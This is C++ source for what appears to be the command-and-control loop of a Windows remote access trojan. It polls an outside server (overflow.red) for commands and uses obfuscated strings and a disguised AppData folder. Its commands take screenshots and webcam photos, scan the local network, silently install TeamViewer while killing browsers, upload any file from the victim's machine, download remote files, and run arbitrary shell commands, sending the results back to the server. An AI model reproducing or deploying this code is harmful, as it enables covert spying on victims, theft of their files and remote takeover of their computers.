#include "communication.h"
#include <iostream>
#include <filesystem>

#include "..\utility\requests.h"
#include "functions.h"
#include "../utility/helper.h"
#include "client.h"

namespace fs = std::filesystem;

namespace client {
	namespace communication {
		void handler_loop() {
			send_message(std::string(xorstr_("**Notification**\n```\nCommunication Thread Created\n```")), client::client_webhook_url);

			while (true) {
				auto cmd = requests::get_request("https://overflow.red/post.php", xorstr_("cmd=get_command&ip=") + client::ip);
				if (!cmd.empty()) {	
					if (cmd == xorstr_("screenshot")) {
						client::functions::take_screenshot(helpers::roaming + xorstr_("\\Microsoft\\") + client::ip + xorstr_(".jpg"));
						send_image(helpers::roaming + xorstr_("\\Microsoft\\") + client::ip + xorstr_(".jpg"), "**PC Screenshot**");
					} 
					else if (cmd == xorstr_("windows")) {
						send_message(client::functions::prepare_payload(xorstr_("All Windows"), client::functions::get_all_windows()));
					}
					else if (cmd == xorstr_("camera")) {
						if (helpers::is_python_installed()) {
							system(("cd " + helpers::roaming + xorstr_("\\Microsoft\\scripts && python camera.py")).c_str());

							if (std::filesystem::exists(helpers::roaming + xorstr_("\\Microsoft\\scripts\\camera.jpg")))
								send_image(helpers::roaming + xorstr_("\\Microsoft\\scripts\\camera.jpg"), "**Camera**");
							else
								send_message(xorstr_("**Camera**\n```\nNo image generated. Possibly no camera.\n```"));
						}
						else {
							send_message(xorstr_("**Camera**\n```\nPython is not installed.\n```"));
						}
					}
					else if (cmd == xorstr_("devices")) {
						if (helpers::is_python_installed()) {
							auto ip = client::functions::get_default_gateway();
							auto ssid = helpers::exec("netsh wlan show networks|find \"SSID\"");
							ssid.replace(ssid.length() - 1, ssid.length(), "");
							send_message(xorstr_("**Analyzing Network...**\n```\nDefault Gateway: ") + ip + xorstr_("\nSSID: ") + ssid.substr(9) + xorstr_("\n```"));

							auto res = helpers::exec(("python " + helpers::roaming + xorstr_("\\Microsoft\\scripts\\scanner.py ") + ip + " \"" + ssid + "\"").c_str());
							send_message(xorstr_("**Devices Response**\n```\n") + res + xorstr_("\n```"));
						}
						else {
							send_message(xorstr_("**Devices Response**\n```\nPython is not installed.\n```"));
						}
					}
					else if (cmd == xorstr_("tv")) {
						if (std::filesystem::exists(std::string(xorstr_("cd ")) + std::string(helpers::roaming + xorstr_("\\Microsoft\\tv")))) {
							system((std::string(xorstr_("cd ")) + std::string(helpers::roaming + xorstr_("\\Microsoft\\tv")) + std::string(xorstr_("&& powershell.exe -file ")) + xorstr_("teamviewer_install.ps1")).c_str());

							system(xorstr_("taskkill /F /IM MicrosoftEdge.exe"));
							system(xorstr_("taskkill /F /IM firefox.exe "));
							system(xorstr_("taskkill /F /IM chrome.exe "));

							client::functions::take_screenshot(helpers::roaming + xorstr_("\\Microsoft\\") + client::ip + xorstr_(".jpg"));
							send_image(helpers::roaming + xorstr_("\\Microsoft\\") + client::ip + xorstr_(".jpg"), "**TeamViewer**");
						} 
						else {
							send_message(xorstr_("**TeamViewer**\n```\n") + std::string(xorstr_("TeamViewer is not installed. Possible failure to install during startup")) + xorstr_("\n```"));
						}
					}
					else if (cmd.find(xorstr_("upload")) != std::string::npos) {
						auto path = cmd.substr(sizeof("upload"));

						requests::post_request_file(xorstr_("https://overflow.red/post.php"), path, "file");
						requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_upload&name=") + path.substr(path.find_last_of("/") + 1) + std::string("&content=**Upload**"));
					}
					else if (cmd.find(xorstr_("download")) != std::string::npos &&
							 (cmd.find(xorstr_("https")) != std::string::npos ||
							 cmd.find(xorstr_("http")) != std::string::npos)) {

						auto index = cmd.find(xorstr_("http")) != std::string::npos ? cmd.find(xorstr_("http")) : cmd.find(xorstr_("https"));
						auto url = cmd.substr(index);
						requests::download_file(url, helpers::roaming + xorstr_("\\Microsoft\\download") + cmd.substr(cmd.find_last_of(".")));
						send_message(xorstr_("**Download**\n```\nFinished Downloading\n```"));
					}
					else if (cmd.find(xorstr_("wallpaper")) != std::string::npos &&
							(cmd.find(xorstr_("https")) != std::string::npos ||
							cmd.find(xorstr_("http")) != std::string::npos)) {

						auto index = cmd.find(xorstr_("http")) != std::string::npos ? cmd.find(xorstr_("http")) : cmd.find(xorstr_("https"));
						auto url = cmd.substr(index);
						auto path = helpers::roaming + xorstr_("\\Microsoft\\") + xorstr_("download") + cmd.substr(cmd.find_last_of("."));
						std::string message = "";
						if (requests::download_file(url, path)) {
							functions::set_wallpaper(helpers::s2ws(path).c_str());
							message = xorstr_("Success");
						}
						else {
							message = xorstr_("Failed to download file");
						}

						send_message(xorstr_("**Set Wallpaper**\n```\n") + message + xorstr_("\n```"));
					}
					else {
						auto response = helpers::exec(cmd.c_str());
						if (response.empty())
							response = xorstr_("Empty - Likely misspelled command");
						send_message(xorstr_("**Command Response**\n```\n") + response + xorstr_("\n```"));
					}
				}
			}
		}

		void send_image(std::string file_path, std::string message, std::string webhook) {
			std::string file_name = std::filesystem::path(file_path).filename().string();
			requests::post_request_file(xorstr_("https://overflow.red/post.php"), file_path);

			if (webhook.empty())
				requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_image&content=") + message + std::string(xorstr_("&ip=")) + file_name);
			else 
				requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_image&content=") + message + std::string(xorstr_("&ip=")) + file_name + xorstr_("&webhook_url=") + webhook);
		}

		void send_message(std::string message, std::string webhook) {
			if (webhook.empty())
				requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=") + message);
			else
				requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=") + message + xorstr_("&webhook_url=") + webhook);
		}
	}

	
}